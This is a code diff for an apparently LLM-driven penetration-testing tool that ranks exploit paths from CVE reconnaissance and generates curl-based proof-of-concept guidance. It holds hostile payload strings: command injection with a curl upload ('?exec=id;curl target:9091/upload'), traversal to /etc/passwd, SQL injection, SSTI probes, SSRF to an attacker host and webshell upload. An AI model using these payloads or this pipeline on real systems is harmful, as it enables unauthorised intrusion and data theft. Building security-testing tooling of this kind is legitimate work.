@@ -13822,6 +13822,119 @@ def _flag_exploit_confirmed(cve, ip, port, command, eid):
         logging.debug("flag exploit_confirmed failed: %s", e)
 
 
+def _recon_strategist(cve, product, version, recon_guidance, hint_guidance,
+                      research_analysis, model=None, run_id=None):
+    """SKILL: analyze all collected recon (port sweep, basic self-fetch, Arjun classified
+    params, ZAP spider + alerts, operator hints, research analysis) and produce a RANKED
+    EXPLOIT PLAN before we hand it to synth. This gives synth a curated top-1 approach
+    with a concrete injection point + payload shape, instead of dumping raw recon and
+    letting the LLM pick.
+    Returns the strategy text ready to prepend to synth guidance (empty on any failure —
+    pipeline continues without it, so this only ever ADDS signal, never blocks a build)."""
+    if not (recon_guidance or hint_guidance or research_analysis):
+        return ""
+    tag_ver = f" ({product} {version})" if (product or version) else ""
+    prompt = (
+        "You are a pentest recon strategist. You have ALREADY collected everything below. "
+        f"Your job: pick the SINGLE most likely exploit path for {cve}{tag_ver} and phrase "
+        "it as concrete guidance for a synth agent that will emit a curl-based PoC.\n\n"
+        "HARD RULES:\n"
+        "- The `primary.endpoint` MUST be a path listed in RECON SIGNALS (ZAP-spidered or "
+        "  Arjun-classified). Do NOT invent endpoints from CVE knowledge, blog posts, or "
+        "  general training data. If you don't have a grounded endpoint, use `/`.\n"
+        "- If Arjun CLASSIFIED HIGH-SIGNAL PARAMS lists an RCE/SQLi/LFI/SSTI target, that "
+        "  target IS the primary unless you have equally strong evidence for something else.\n"
+        "- One primary. Two alternatives. No prose outside the JSON.\n\n"
+        f"CVE: {cve}{tag_ver}\n"
+        f"OPERATOR HINTS (authoritative):\n{hint_guidance or '(none)'}\n\n"
+        f"RECON SIGNALS:\n{(recon_guidance or '(none)')[:5000]}\n\n"
+        f"RESEARCH ANALYSIS:\n{str(research_analysis or '(none)')[:2500]}\n\n"
+        "Return ONE JSON object only:\n"
+        "{\n"
+        '  "primary": {\n'
+        '    "class": "<RCE|SQLi|LFI|SSRF|SSTI|XXE|Auth Bypass|File Upload|IDOR|other>",\n'
+        '    "endpoint": "<path from the spidered set — MUST be one Arjun/ZAP found>",\n'
+        '    "param": "<parameter name from Arjun findings, or a body field>",\n'
+        '    "method": "GET|POST",\n'
+        '    "payload_hint": "<concrete first-try payload, e.g. `?exec=id;curl target:9091/upload -d ...`>",\n'
+        '    "success_signal": "<what the assertion should match — canary string, output pattern, response header>",\n'
+        '    "why": "<one sentence tying the recon evidence to this choice>"\n'
+        "  },\n"
+        '  "alternatives": [\n'
+        '    {"class": "...", "endpoint": "...", "param": "...", "payload_hint": "...", "why": "..."},\n'
+        '    {"class": "...", "endpoint": "...", "param": "...", "payload_hint": "...", "why": "..."}\n'
+        "  ]\n"
+        "}"
+    )
+    try:
+        res = _llm_for_model(prompt, model=model, caller="recon_strategist", num_predict=700)
+        rtext = res.get("response", "") if isinstance(res, dict) else str(res or "")
+        j = _poc_extract_json(rtext) or {}
+    except Exception as e:  # noqa: BLE001
+        logging.debug("recon strategist failed: %s", e)
+        j = {}
+    if not j or not j.get("primary"):
+        if run_id:
+            _poc_trace(run_id, "recon:strategist", response="(empty plan)")
+        return ""
+    pri = j.get("primary") or {}
+    alts = j.get("alternatives") or []
+    # Validation: the strategist's primary endpoint MUST come from actual recon —
+    # ZAP paths + '/', or from an operator hint. Otherwise it's an LLM guess from
+    # training data (e.g. hallucinating `/get_head` when the real CVE endpoint is
+    # elsewhere). When the primary is out-of-recon, drop it, promote the top
+    # alternative that IS grounded, and demote the guess to an alt.
+    zap_paths = _extract_zap_paths(recon_guidance or "")
+    grounded_paths = set(zap_paths) | {"/", ""}
+    def _grounded(candidate):
+        ep = str(candidate.get("endpoint") or "").split("?")[0].split("#")[0].strip()
+        if not ep or ep == "/":
+            return True
+        # Match exact, prefix, or the classified Arjun path list
+        for path in grounded_paths:
+            if ep == path or ep.rstrip("/") == path.rstrip("/"):
+                return True
+            if path and path != "/" and (ep.startswith(path) or path.startswith(ep)):
+                return True
+        # Referenced by an operator hint? (very light heuristic)
+        if hint_guidance and ep in str(hint_guidance):
+            return True
+        return False
+    if not _grounded(pri):
+        alt_grounded = [a for a in alts if _grounded(a)]
+        if alt_grounded:
+            guess = pri
+            pri = alt_grounded[0]
+            alts = [a for a in alts if a is not pri]
+            # Keep the ungrounded guess visible for debugging but demote it.
+            alts.append({**guess, "why": "(demoted: endpoint not in recon) "
+                                        + str(guess.get("why", ""))})
+            if run_id:
+                _poc_trace(run_id, "recon:strategist_validation",
+                           response=f"primary endpoint {guess.get('endpoint')!r} not in "
+                                    f"recon — promoted grounded alternative "
+                                    f"{pri.get('endpoint')!r} instead")
+    plan = (
+        "STRATEGIST-CURATED PLAN (authoritative — the recon has been analyzed for you; "
+        "TRY THE PRIMARY FIRST, then fall back to alternatives on failure): "
+        f"PRIMARY: class={pri.get('class','?')} endpoint={pri.get('endpoint','/')} "
+        f"param={pri.get('param','?')} method={pri.get('method','GET')} "
+        f"payload_hint=`{pri.get('payload_hint','')}` "
+        f"success_signal=`{pri.get('success_signal','')}` "
+        f"why={pri.get('why','')}. "
+    )
+    for i, alt in enumerate(alts[:2], 1):
+        plan += (f"ALT{i}: class={alt.get('class','?')} endpoint={alt.get('endpoint','?')} "
+                 f"param={alt.get('param','?')} payload=`{alt.get('payload_hint','')}` "
+                 f"why={alt.get('why','')}. ")
+    if run_id:
+        _poc_trace(run_id, "recon:strategist", response=plan[:1500],
+                   extra={"primary_class": pri.get("class"),
+                          "primary_endpoint": pri.get("endpoint"),
+                          "primary_param": pri.get("param")})
+    return plan
+
+
 def _synthesize_cve_poc(cve, ip, port, product, version, eid, run_id=None, guidance_extra="", model=None):
     """Increment 1: research the CVE + synthesize a first-draft PoC (command+assertion).
     Writes research+synth to the filesystem trail. Does NOT persist a security_test
@@ -14520,6 +14633,134 @@ def _scout_open_ports(ip, primary_port, timeout=1.2):
     return header + "\n" + "\n".join(lines)
 
 
+def _arjun_classify_param(name):
+    """Map a param name to its likely vulnerability class + a payload shape hint. Helps
+    the LLM synth pick the RIGHT primitive rather than guessing at param semantics.
+    Returns (class, payload_hint) or None. Best-effort semantic match — a `cmd` param
+    is 95% of the time RCE; a `url` param is 90% SSRF/open-redirect; etc."""
+    n = str(name or "").lower().strip()
+    if not n:
+        return None
+    # Command injection — highest priority (RCE trumps everything on the objective list)
+    for kw in ("cmd", "command", "exec", "execute", "run", "system", "shell",
+               "code", "eval", "exec_", "op"):
+        if n == kw or n.startswith(kw + "_") or n.endswith("_" + kw):
+            return ("COMMAND INJECTION / RCE",
+                    f"try `?{name}=id` (proof marker) or `?{name}=;id` / `?{name}=|id` for shell chaining")
+    # LFI / path traversal
+    for kw in ("file", "path", "page", "template", "include", "require",
+               "doc", "document", "view", "read", "load"):
+        if n == kw or n.startswith(kw + "_") or n.endswith("_" + kw):
+            return ("LFI / path traversal",
+                    f"try `?{name}=../../../../etc/passwd` or `?{name}=/etc/hostname`")
+    # SSRF / open redirect
+    for kw in ("url", "uri", "link", "redirect", "next", "return", "callback",
+               "forward", "goto", "fetch", "target", "dest", "host"):
+        if n == kw or n.startswith(kw + "_") or n.endswith("_" + kw):
+            return ("SSRF / open redirect",
+                    f"try `?{name}=http://<attacker>/` or `?{name}=file:///etc/passwd`")
+    # SQLi
+    for kw in ("id", "uid", "pid", "cid", "user_id", "post_id", "sort", "order",
+               "filter", "search", "q", "query", "category", "cat"):
+        if n == kw or n.startswith(kw + "_") or n.endswith("_" + kw):
+            return ("SQL injection",
+                    f"try `?{name}=1' OR 1=1-- -` or UNION-based on this param")
+    # SSTI
+    for kw in ("tpl", "layout", "theme", "skin", "engine", "render"):
+        if n == kw or n.startswith(kw + "_") or n.endswith("_" + kw):
+            return ("SSTI / template injection",
+                    f"try `?{name}={{7*7}}` (Twig/Jinja) or `?{name}=${{7*7}}` (Freemarker)")
+    # File upload / XXE
+    if n in ("upload", "file_upload", "attach", "attachment", "xml", "content"):
+        return ("File upload / XXE",
+                f"try `POST` with multipart file field `{name}` (webshell) or XML with external entity")
+    return None
+
+
+def _arjun_worth_probing(path):
+    """True when a path is worth an Arjun run — false for static assets. Arjun on a CSS
+    or image endpoint burns 30s to prove nothing; we want app endpoints. Also skip
+    long URLs and query-only artifacts."""
+    if not path or not isinstance(path, str):
+        return False
+    p = path.split("?", 1)[0].split("#", 1)[0].lower()
+    if len(p) > 120:
+        return False
+    for ext in (".css", ".js", ".map", ".png", ".jpg", ".jpeg", ".gif", ".svg",
+                ".ico", ".woff", ".woff2", ".ttf", ".eot", ".pdf", ".mp4",
+                ".webp", ".webm", ".mp3", ".zip"):
+        if p.endswith(ext):
+            return False
+    # Static-asset directory prefixes — the paths under them are covered by root probes.
+    for pfx in ("/assets/", "/static/", "/template/", "/dist/", "/build/",
+                "/vendor/", "/node_modules/", "/fonts/", "/images/", "/img/",
+                "/css/", "/js/", "/media/", "/favicon"):
+        if p.startswith(pfx):
+            return False
+    return True
+
+
+def _extract_zap_paths(zap_guidance):
+    """Pull the distinct paths out of a `_zap_recon` guidance string. Returns [] on
+    empty input. The string format is stable — 'ZAP-spidered paths: /a, /b, /c'."""
+    if not zap_guidance:
+        return []
+    import re as _re
+    m = _re.search(r"ZAP-spidered paths:\s*([^|]+?)(?:\s*\||$)", zap_guidance)
+    if not m:
+        return []
+    return [p.strip() for p in m.group(1).split(",") if p.strip()]
+
+
+def _scout_arjun_paths(ip, port, paths, max_targets=5, timeout_per_path=45, threads=25):
+    """Fan Arjun across a list of paths — deep param discovery, not just at root. Skips
+    static assets (see _arjun_worth_probing) and caps at max_targets so we spend the
+    time budget on the highest-signal endpoints. Aggregates per-path findings into a
+    single guidance string.
+    Rationale: Arjun on '/' only finds params the app honors at the root; hidden
+    endpoints like /pwd/, /admin/, /api/v1/... have their own param sets."""
+    if not paths:
+        return "", {}
+    interesting = [p for p in paths if _arjun_worth_probing(p)]
+    # Always include root as the anchor, if the caller didn't already
+    if "/" not in interesting:
+        interesting = ["/"] + interesting
+    # Cap and de-dupe while preserving order
+    seen = set(); ordered = []
+    for p in interesting:
+        if p in seen:
+            continue
+        seen.add(p); ordered.append(p)
+        if len(ordered) >= max_targets:
+            break
+    per_path = {}
+    lines = []
+    classified = []  # (path, param, class, hint) — the strongest signals
+    for p in ordered:
+        one = _scout_arjun(ip, port, path=p, timeout=timeout_per_path, threads=threads)
+        per_path[p] = one
+        if one and "no honored params" not in one:
+            import re as _re
+            m = _re.search(r"honored params[^:]*:\s*([^\.]+)\.", one)
+            if m:
+                params_str = m.group(1).strip()
+                lines.append(f"  {p}: {params_str}")
+                # Classify each param — highest-signal params (cmd/exec/url/file/id) get
+                # elevated with a class + payload shape so the LLM doesn't have to guess.
+                for pname in [x.strip() for x in params_str.split(",") if x.strip()]:
+                    cls = _arjun_classify_param(pname)
+                    if cls:
+                        classified.append((p, pname, cls[0], cls[1]))
+    if not lines:
+        return "Arjun deep-scan: no honored params on any spidered endpoint", per_path
+    body = ("Arjun deep-scan (params honored per endpoint):\n" + "\n".join(lines))
+    if classified:
+        body += ("\n\nCLASSIFIED HIGH-SIGNAL PARAMS (strongest suspects — try these FIRST):\n"
+                 + "\n".join(f"  {path} param `{pname}` → likely {cls}. {hint}"
+                             for path, pname, cls, hint in classified))
+    return body, per_path
+
+
 def _scout_arjun(ip, port, path="/", timeout=60, threads=25):
     """Parameter-name discovery on a single URL via Arjun. Diffs baseline vs test
     requests to spot params the app honors (reflection / status / length change) —
@@ -14774,15 +15015,9 @@ def _build_poc_core(cve, ip, port, product, version, eid, max_iters=3, research=
                 if b:
                     segments.append(b)
                     _poc_trace(run_id, "recon:basic", response=b[:1200])
-            if want_arjun:
-                _t0 = _t.time()
-                a = _scout_arjun(ip, port)
-                recon_metrics["arjun"] = {"seconds": round(_t.time() - _t0, 2),
-                                          "chars_added": len(a or ""),
-                                          "signal": "honored param names (single URL)"}
-                if a:
-                    segments.append(a)
-                    _poc_trace(run_id, "recon:arjun", response=a[:1200])
+            # Order: ZAP spider FIRST so Arjun can fan out across the discovered paths.
+            # Falls back to a single Arjun on '/' when ZAP wasn't requested.
+            zap_paths = []
             if want_zap:
                 _t0 = _t.time()
                 z = _zap_recon(ip, port, active_scan=want_zap_active)
@@ -14796,6 +15031,23 @@ def _build_poc_core(cve, ip, port, product, version, eid, max_iters=3, research=
                     segments.append(z)
                     _poc_trace(run_id, "recon:zap" + ("_active" if want_zap_active else ""),
                                response=z[:1200])
+                    zap_paths = _extract_zap_paths(z)
+            if want_arjun:
+                _t0 = _t.time()
+                if zap_paths:
+                    # Deep mode: fan Arjun across the spidered endpoints.
+                    a, per_path = _scout_arjun_paths(ip, port, zap_paths)
+                    signal = f"honored params per endpoint (fanned across {len(per_path)} paths)"
+                else:
+                    # Fallback: single Arjun on root only.
+                    a = _scout_arjun(ip, port)
+                    signal = "honored param names (single URL, no zap paths)"
+                recon_metrics["arjun"] = {"seconds": round(_t.time() - _t0, 2),
+                                          "chars_added": len(a or ""),
+                                          "signal": signal}
+                if a:
+                    segments.append(a)
+                    _poc_trace(run_id, "recon:arjun", response=a[:1400])
         except Exception:  # noqa: BLE001
             pass
         recon_guidance = " ".join(segments)
@@ -14856,6 +15108,24 @@ def _build_poc_core(cve, ip, port, product, version, eid, max_iters=3, research=
             guidance = (auth_guidance + " " + " ".join(parts)).strip()
         except Exception as e:  # noqa: BLE001
             logging.debug("build research step failed: %s", e)
+    # Strategist skill: analyze all recon + hints + research and produce a curated
+    # ranked plan. Prepended to synth guidance so synth sees the top-1 approach first
+    # rather than having to derive it from raw signals. Fails soft — pipeline continues
+    # without it if the LLM call fails.
+    try:
+        strategy = _recon_strategist(
+            cve, product, version,
+            recon_guidance=recon_guidance,
+            hint_guidance=hint_guidance,
+            research_analysis=(research_out or {}).get("analysis") if research else None,
+            model=model, run_id=run_id,
+        )
+    except Exception as e:  # noqa: BLE001
+        logging.debug("recon strategist skipped: %s", e)
+        strategy = ""
+    if strategy:
+        # Strategist plan wins prominence: prepend to guidance, ahead of everything else.
+        guidance = strategy + " " + guidance
     built = _synthesize_cve_poc(cve, ip, port, product, version, eid, run_id=run_id,
                                 guidance_extra=guidance, model=model)
     result = _run_refine_poc(cve, ip, port, built["command"], built["assertion"], eid,
